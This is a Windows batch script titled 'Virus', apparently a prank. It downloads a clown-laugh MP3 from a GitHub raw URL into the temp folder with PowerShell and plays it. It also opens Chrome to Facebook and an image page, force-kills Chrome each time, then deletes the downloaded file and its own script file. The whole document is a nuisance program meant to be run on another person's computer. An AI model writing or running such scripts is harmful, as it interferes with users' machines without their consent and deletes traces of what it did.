title Virus
cls
@echo off
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/FearOffTheFart/Bash/master/clownlaugh.mp3 -OutFile %temp%\asd.mp3"
%temp%\asd.mp3
start chrome.exe "https://www.facebook.com/"
timeout 6
taskkill /IM chrome.exe -F
start chrome.exe "http://art-exlibris.net/images/large/exlibris_21693.jpg"
timeout 4
taskkill /IM chrome.exe -F
::powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/FearOffTheFart/Bash/master/clownlaugh.mp3 -OutFile %temp%\asd.mp3"
::%temp%\asd.mp3
del %temp%\asd.mp3
del virus2.bat


